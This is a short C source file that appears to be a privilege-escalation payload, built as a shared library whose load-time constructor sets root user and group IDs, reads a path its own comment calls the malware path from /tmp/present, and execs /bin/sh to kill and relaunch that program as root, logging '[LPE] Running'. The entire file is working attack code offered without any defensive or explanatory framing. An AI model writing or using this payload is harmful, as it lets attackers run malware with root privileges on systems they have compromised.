#include <stdio.h>
#include <unistd.h>
#define TMP_PATH "/tmp/present"
#define PATH_LEN 255

void __attribute__((constructor)) setup() {
  setreuid(0, 0);
  setregid(0, 0);

  // read malware path
  FILE *tmp = fopen(TMP_PATH, "r");
  char buf[PATH_LEN] = {0};
  if (fread(buf, sizeof(char), PATH_LEN, tmp) == 0) {
    printf("Read failed!");
    return;
  }

  fclose(tmp);

  char p[4096] = {0};

  sprintf(p, "\"kill `pidof %s`; %s\"", buf, buf);
  printf("[LPE] Running: %s\n", buf);
  // exec
  char *empty[] = {"-c", p};
  execve("/bin/sh", empty, empty);
}
